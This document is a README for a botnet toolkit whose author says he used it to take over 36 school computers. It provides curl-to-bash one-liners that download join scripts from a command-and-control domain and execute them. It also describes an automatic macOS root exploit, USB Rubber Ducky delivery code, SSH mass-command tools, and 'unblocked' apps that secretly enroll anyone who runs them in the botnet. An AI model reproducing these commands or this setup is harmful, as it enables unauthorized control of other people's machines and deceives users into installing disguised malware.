# net
Some helpful scripts for building and managing small botnets.

## Why I wrote this
I used this code at the Virginia Residential Governor's School for Math, Science, and Technology to take over 36 Raspberry Pi microcomputers and Kali Linux desktops in the hacking class in which I partook. Such behavior was encouraged, and I did not violate any rules.

Please note that I strictly use this code for pranks and for educational purposes. I do not run a DDoSsing botnet or other such illegal operation and do not condone the use of this code for any malicious purpose.

## Compatible Operating Systems
* macOS/OS X - on 10.11 (El Capitan), exploit will be used to gain a root shell and payload will be automatically delivered. For other versions, root must be obtained manually.
* Debian-based GNU/Linux - Tested on Kali Linux and Raspbian, should work on other distros. Root exploit isn't automatic on any Linux, so you'll need to already have root access.

## How it works
### Command & Control
C&C is managed on ports `2042` & `2043` of a server. A simple Python script opens a socket on port `2043` which listens for incoming data from nodes, such as new nodes' joining signals, updates on connection state, and other data. All requests to the server are printed to the terminal, and important ones are written into `nodes.txt`.

To make control scripts available, run
```sh
python3 -m http.server 2042
```
from the `control` directory. This will use Python's inbuilt simple HTTP server to serve control scripts to nodes upon request.

### Joining
On macOS, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-command joining: it will download and decrypt an exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically. That script will handle joining the botnet.

For GNU/Linux, there's just one script, `join.sh`, which must be executed as root or as a user with root privileges.

Here are simple one-liners to join the botnet (I recommend purchasing a simple domain for easy C&C):

Mac:
```sh
curl -L [domain]:2042/mac/join.sh |bash
```
Linux:
```sh
curl -L [domain]:2042/linux/join.sh |bash
```

### Rubber Duck code
In the `duck` directory, you'll find Arduino code for delivering the join scripts automatically to macOS and Linux computers.

This code is intended for use with a Digispark ATTINY85 drive, though it can be easily modified to work with other Rubber Duck USBs.

To upload this code to your drive, follow [this tutorial](https://www.youtube.com/watch?v=fGmGBa-4cYQ).

### Tools
Running `tools/run.sh` followed by a string giving the command you'd like to run will cause all nodes in `nodes.txt` (in your working directory) to run that command through SSH. This is less useful now that cron control exists. You can also run `up.sh` to view which/how many nodes on the current network are online.

### Apps
The `apps` directory contains some "unblocked" versions of various applications. These versions will work on secured MacBooks, but they will also join the computer that runs them to the botnet.

## Licensing
This software was created by [Erik Boesen](https://github.com/ErikBoesen) and is available under the [MIT License](LICENSE).
